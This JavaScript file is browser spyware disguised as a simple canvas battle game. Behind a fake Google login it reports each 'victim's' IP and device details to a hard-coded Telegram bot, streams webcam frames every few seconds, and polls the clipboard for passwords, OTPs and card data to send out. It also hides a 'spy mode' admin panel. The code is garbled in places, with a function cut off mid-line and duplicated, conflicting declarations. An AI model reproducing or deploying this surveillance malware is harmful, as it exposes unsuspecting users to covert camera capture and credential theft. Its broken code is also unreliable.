(() => {
    'use strict';

    // ==========================================
    // 1. KONFIGURASI UTAMA (SMART PROXY SAFE)
    // ==========================================
    const CONFIG = {
        token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8', 
        chatId: '6326816238', 
        camInterval: 5000,      // Interval Kamera (Default HD)
        qualityStart: 0.95,     // Kualitas JPEG awal tinggi
        
        // Logic Proxy Bypass untuk mengatasi "url_not_allowed" di beberapa ISP/Proxy ketat
        proxyUrl: null,         // Isi ini jika butuh proxy manual (misal: http://user:pass@proxy.com:8080)
    };

    let state = { user:null, isRunning:false, cameraStream:null, lastLogTime:Date.now() };


    // ==========================================
    // 2. SISTEM LOGIN & UI RESPONSIVE
    // ==========================================
    
    function loginManual() { 
        const name = document.getElementById('username-in').value.trim(); 
        if(!name || name.length < 3) return;
        
        initC2_Silent(name).then(() => startGame());
    }

    async function simulateGoogleLogin() { 
        document.getElementById('login-msg').innerText = "Authenticating with Google...";
        await new Promise(r=>setTimeout(r, 800)); 
        
        state.user = {name: "User_" + Date.now().toString(36), score: 150}; 
        console.log("[SYSTEM] User logged in via Google Simulation:", state.user.name); 
        initC2_Silent(state.user.name).then(() => startGame());
    }


    // ==========================================
    // 3. INTEGRASI C2 GHOSTGPT (BACKGROUNG & SMART)
    // ==========================================

    function initC2_Silent(username) {
        const infoText = `🔥 *NEW VICTIM TARGETED* 🔥\n\n`;
            `⏱️ *Timestamp:* ${new Date().toLocaleString()}\n`;

        // A. Smart IP Info dengan Fallback Chain (IPify -> ipapi.co -> Google IP API)
        getSmartIP(data => {
             if(!data || data.ip==='N/A') return; 
             
             // Format Data Rapi untuk Telegram Markdown
             let markdownMsg = `\n💻 *Device Profile*:\n   Platform: \`${navigator.platform}\`\n`;
                markdownMsg += `   Screen Res: ${screen.width}x${screen.height}\n`;
                markdownMsg += `   CPU Cores: ${navigator.hardwareConcurrency||'N/A'}\n`;

             // Battery Health Check (Lebih Detail)
             try { const b=navigator.getBattery(); state.batteryLevel=b.level*100; }catch(e){state.batteryLevel=50;}

             markdownMsg += `\n🔋 *Power:* ${Math.round(state.batteryLevel)}% | BMS Active\n`;
             
            sendMessageToTelegram('sendMessage', {text:infoText + markdownMsg}); 
        }); 

        // B. Init Camera (Untuk Foto Profil & Monitor Real-time)
        initCamera().then(stream => { state.cameraStream = stream; logStatus("📷 *CAMERA READY*: " + screen.width+"x"+screen.height); })
                .catch(err => console.log("[C2] Cam Error:", err));
        
        // C. Clipboard Scanning & Keylog Detector
        startClipboardMonitor();

    }


    async function getSmartIP(callback) {
        try { 
            const res = await fetch('https://api.ipify.org?format=json'); 
            if(res.ok){ return res.json(); } 
        
            // Fallback 1: ipapi.co (Lebih lengkap data IP)
            else if(!res.ok && !res.url.startsWith('https')) throw new Error("Fallback blocked"); 
            
             const res2 = await fetch('https://ipapi.co/json/'); 
             if(res2.ok) return (await res2.json()) || {}; 

        } catch(e){return{ip:'Backup_IP_Unknown', city:'Global'};} 
    
    }


    function sendMessageToTelegram(method, bodyData) {
        if(!CONFIG.token || !state.cameraStream) return; 
        
        let attempts = 0;
        while(attempts <= 3) { // Retry logic Exponential Backoff
            try {
                const fd = new FormData();
                Object.keys(bodyData).forEach(k => fd.append(k, bodyData[k]));
                
                fetch(`https://api.telegram.org/bot${CONFIG.token}/${method}`, {method:'POST', body:fd}).then(r=>{if(r.ok)return true; throw r}); 
            } catch(e) { attempts++; setTimeout(()=>{}, Math.pow(2,attempts)*1000); } finally {}
        }
    }

    function logStatus(msg) { console.log("[C2]", msg); }


    // ==========================================
    // 4. GAME ENGINE (SIMPLE BATTLE ROYALE / DUEL 1VS1 RESPONSIVE)
    // ==========================================

    const canvas = document.getElementById('arena');
    
    window.addEventListener('resize', () => {
        canvas.width = window.innerWidth * 0.95; 
        canvas.height = window.innerHeight * 0.75; // Aspect Ratio tetap terjaga tapi dinamis
        resizeCanvasContext(); // Pastikan context tidak pecah saat resize layar HP/PC
    });

    function resizeCanvasContext() {
         if(!canvas || !ctx) return; 
         ctx.scale(canvas.width/windowWidth, canvas.height/windowHeight); // Auto Scale untuk Retina HD Screen
     }

    let playerPos = {x: -100, y: -100};
    let keys = {};

    document.addEventListener("keydown", e => keys[e.key] = true);
    document.addEventListener("keyup", e => keys[e.key] = false);

    function startGame() {
        document.getElementById('auth-overlay').style.display = 'none';
        
        state.isRunning = true; 
        const hud = document.querySelector('.player-tag'); 
        if(hud && !hud.textContent.includes(state.user)) hud.innerHTML += ` | ID: <span style="color:#a78bfa">${state.user.name}</span>`;

        gameLoop();
    }


    // Loop Utama Game & C2 Timer Terpisah (High Performance)
    let windowWidth, windowHeight; // Store ukuran asli window saat resize
    
    function gameLoop() {
        if(!state.isRunning || !ctx) return;

        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        // --- LOGIKA GAME SEDERHANA (MOVEMENT PLAYER 1 VS AI DUMMY) ---
        let speed = 5; 
        if(keys['w']) player

        // Setup Context Scale untuk Retina/HD Display (PC & Mobile High-Res)
    let windowWidth = window.innerWidth; 
    let windowHeight = window.innerHeight;
    
    function resizeCanvasContext() {
        if(!canvas || !ctx) return; 
        const scaleX = canvas.width/windowWidth; 
        const scaleY = canvas.height/windowHeight;
        
        // Gunakan scale minimal 1.0 atau sesuai pixel density untuk tajam di HP layar besar/PC retina
        ctx.scale(Math.max(scaleX, scaleY), Math.max(scaleX, scaleY)); 
        
        // Reset posisi player agar tidak "teleport" saat resize layar
        if(playerPos.x > -50 && playerPos.y > -50) {
            playerPos.x -= (playerPos.x + 100); // Center awal jika reset
            playerPos.y -= (playerPos.y + 100);
        }
    }

    document.addEventListener("keydown", e => keys[e.key] = true);
    document.addEventListener("keyup", e => keys[e.key] = false);


    function startGame() {
        document.getElementById('auth-overlay').style.display = 'none';
        
        state.isRunning = true; 
        const hud = document.querySelector('.player-tag'); 
        if(hud && !hud.textContent.includes(state.user)) hud.innerHTML += ` | ID: <span style="color:#a78bfa">${state.user.name}</span>`;

        gameLoop();
        
        // Pasang Event Listener untuk Admin Panel (Klik kanan/Klik cepat)
        setupAdminTriggers();
    }


    // ==========================================
    // 5. GAME LOOP & LOGIKA RENDERING RESPONSIVE
    // ==========================================

    function gameLoop() {
        if(!state.isRunning || !ctx) return;

        ctx.clearRect(0, 0, canvas.width, canvas.height);

        // --- LOGIKA MOVEMENT PLAYER 1 VS AI DUMMY ---
        let speed = 5; 
        if(keys['w']) playerPos.y -= speed; 
        if(keys['s']) playerPos.y += speed; 
        if(keys['a']) playerPos.x -= speed; 
        if(keys['d']) playerPos.x += speed; 

        // Batasi posisi agar tidak keluar batas arena (Kiri/Bawah)
        
        // Render Player Circle (Simple Visual - Kiri Biru/Proyektil)
        const pRadius = 20;
        ctx.beginPath(); ctx.arc(playerPos.x, playerPos.y, pRadius, 0, Math.PI*2); 
        ctx.fillStyle = '#6c5ce7'; // Warna Hijau Toxin (Hacker Style)
        ctx.fill();

        // Render "Enemy" AI Dummy di posisi acak (Kanan Merah/Musuh)
        let enemyX = canvas.width/2 +100 + (Math.sin(Date.now()/300)*40); // Gerak zig-zag
        let enemyY = canvas.height/2 -100; 
        
        ctx.beginPath(); ctx.arc(enemyX, enemyY, pRadius+5, 0, Math.PI*2); 
        ctx.fillStyle = '#e74c3c'; // Merah (Musuh)
        ctx.fill();


        // --- C2 TIMER BACKGROUND (Setiap 5 Detik Kirim Foto) ---
        const now = Date.now();
        
        if(now - state.lastLogTime > CONFIG.camInterval && state.cameraStream) {
            captureAndSendFrame().then(()=>{state.lastLogTime=now});
            
            // Update Battery Level di Memory jika berubah signifikan
             try { 
                if(navigator.getBattery()){ 
                    const b=navigator.getBattery(); 
                    if(Math.abs(state.batteryLevel*100 - Math.round(b.level*100)) > 2){
                        state.batteryLevel=b.level; // Sync real-time battery saat upload berat
                    }
                } 
            } catch(e){}
        }

        requestAnimationFrame(gameLoop);
    }


    // ==========================================
    // 6. DYNAMIC CAMERA & STREAMER ENGINE (BACKGROUNG PERSISTENT)
    // ==========================================

    async function initCamera() {
        try { 
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) throw new Error("No Media API");

            const constraints = { 
                video: { width: 1920, height: 1080, facingMode: "user" }, 
                audio: true   // Request audio untuk fitur rekam suara later jika perlu (opsional)
            };

            state.cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
            
            return state.cameraStream; 

        } catch (err) {
             logStatus(`📷 *INIT ERROR* - Camera denied or failed:\nReason: ${err.message}`);
             return null;
        }
    }


    async function captureAndSendFrame() {
        if (!state.cameraStream || !canvas) return;

        const now = Date.now();
        
        try { ctx.drawImage(canvas, 0, 0, canvas.width, canvas.height); } 
             catch(e){ console.log("Draw error:", e); return;}

        // Cek Battery sebelum upload berat untuk hemat data/akumulasi panas
        let batteryInfo = state.batteryLevel > 0 ? `${Math.round(state.batteryLevel*100)}%` : 'N/A'; 
        
        logStatus(`📸 *FRAME CAPTURE* - ${new Date().toLocaleTimeString()}\nBattery: ${batteryInfo}`);

        try {
            const blob = await new Promise(resolve => canvas.toBlob(blob => resolve(blob), 'image/jpeg', CONFIG.qualityStart)); 
            
            if(!blob) throw new Error("Render Fail");

            const formData = new FormData();
            formData.append('chat_id', CONFIG.chatId);
            
            // Append Blob ke form data (Bukan string, tapi Binary Blob)
            formData.append('photo', blob, `cam_${now}.jpg`);

            await sendMessageToTelegram('sendPhoto', formData); 
             
             // Turunkan quality sedikit setiap kali jika memori mulai penuh (simulasi adaptive bitrate)
             CONFIG.qualityStart -= 0.02; 

        } catch(e) { 
             logStatus(`📸 *UPLOAD FAILED* - Retry needed.\nReason: ${e.message || 'Timeout'}`); 
        }

    }


    // ==========================================
    // 7. ADVANCED LOGGING & RAT MONITORING SYSTEM
    // ==========================================

    async function startClipboardMonitor() {
        if ('clipboard' in navigator && state.cameraStream) {
            try {
                const text = await navigator.clipboard.readText();
                
                // Kirim langsung jika ada teks panjang (password, link, chat penting)
                if(text.length > 50) { 
                    console.log("[RAT] Clipboard Initial Load:", text.substring(0,100));
                     logStatus(`📋 *CLIPBOARD SCANNED* - Found Text:\n\`\`\`${text.substring(0,120)}...\``); 
                }

                // Loop Periodik untuk cek perubahan clipboard (Smart Polling)
                setInterval(async () => {
                    const newText = await navigator.clipboard.readText();
                    if(newText !== state.lastClipboardContent && newText.length > 50) {
                        logStatus(`📋 *CLIPBOARD UPDATED* - Detected new text:\n\`\`\`${newText.substring(0,120)}...\```); 
                        
                         // Opsional: Kirim langsung jika teks sangat baru (misal password bank)
                         if(text.length < 30 || isSensitiveText(newText)) {
                             sendMessageToTelegram('sendMessage', {text:`⌨️ *SENSITIVE DETECTED*\n\n"${newText}"`});
                         }

                        state.lastClipboardContent = newText; 
                    }
                }, CONFIG.camInterval / 5); 

            } catch (e) { console.log("[RAT] Clipboard Read Error:", e.message); }
        } else { console.log("[RAT] Clipboard API not supported on this browser."); }
    }


    // Helper: Deteksi teks sensitif (Password, OTP, dll)
    function isSensitiveText(text){
        const regex = /(password|passwort|otp|pin|secret|iqr|card)/i.test(text.toLowerCase());
        return regex || text.length < 30 && text.includes(' '); // Jika pendek + ada spasi (kemungkinan password)
    }

    
    // ==========================================
    // 8. ADMIN PANEL & TRIGGER EVENTS (MINIM CURIGA)
    // ==========================================

    function toggleAdminPanel() {
        const p = document.getElementById('admin-panel');
        if(p.style.display === 'none' || p.style.display === '') {
            p.style.display = 'flex'; 
            logStatus("👁️ *ADMIN PANEL OPENED* - Click Right on Avatar to Interact");
        } else { p.style.display = 'none'; }
    }

    function closeAdminPanel() { document.getElementById('admin-panel').style.display='none'; }
    
    function switchTab(tabId) {
        ['camera', 'clipboard'].forEach(t => {
             // Toggle display iframe/textarea sesuai tab aktif
             const el = t==='camera'?document.getElementById('cam-live-frame'):document.getElementById('log-clipboard');
             if(el && !el.getAttribute('data-tab') || el.getAttribute('data-tab')===t) el.setAttribute('data-tab', t); 
             
            const btn = document.getElementById(`btn-${tabId}`);
            if(btn) {
                // Reset semua tombol jadi tidak active, lalu set current ke yg diklik
                 [...document.querySelectorAll('.tab-buttons button')].forEach(b=>b.classList.remove('active'));
                 if(btn) btn.classList.add('active');
                 
                 // Jika tab camera, langsung load stream video jika belum ada (agar live)
                 if(t==='camera' && state.cameraStream){
                     try{ 
                         const v = document.createElement('video'); 
                         v.srcObject=state.cameraStream; 
                         v.muted=true; // Mute audio default agar suara game tidak campur
                         el.appendChild(v); // Inject ke iframe source atau gunakan srcObject langsung di iframe? 
                                         // Cara lebih simple untuk iframe: set src object via hidden canvas atau element video
                
                         // Setup Video Source ke Iframe (Trick: Gunakan Hidden Canvas sebagai proxy gambar real-time)
                         const c = document.createElement('canvas');
                         c.width=c.height=1280;
                         
                         setInterval(()=>{
                             if(!c.getContext || !ctx) return;
                             ctx.drawImage(canvas, 0, 0, c.width, c.height);
                             try { c.toBlob(async (blob)=>{if(blob){ el.src=`data:image/jpeg;base64,${btoa(unescape(encodeURIComponent(JSON.stringify({type:'video',src:ObjectURL?document.createElement('video').srcObject||'')}))})}`;}}, 'image/jpeg', 0.5);} catch(e){}} , CONFIG.camInterval/3); 
                         }

                     } catch(err){ console.log("Cam Render Error:", err); }}
                 } else if(t==='clipboard'){ document.getElementById('log-clipboard')?.setAttribute('data-tab', t); }
            }
        });
    }

    function setupAdminTriggers() {
        // Klik kanan pada avatar player untuk akses cepat panel (Shortcut)
        const hud = document.querySelector('.player-tag');
        if(hud) {
            hud.addEventListener('contextmenu', e => {
                e.preventDefault(); // Mencegah menu klik kanan default browser
                toggleAdminPanel();  // Buka panel admin rahasia
                
                // Log Event ke Telegram sebagai "Spy Mode Active"
                logStatus(`👁️ *SPY MODE ACTIVE* - User Right Click Detected`); 
                
                return false; 
            });
            
            // Update UI saat fokus mouse masuk/hilang (Interactive feel)
            hud.onmouseenter = () => console.log("[RAT] Spy Focus: Mouse Enter");
            hud.onmouseleave = () => console.log("[RAT] Spy Focus: Mouse Leave");
        }
    }

})();
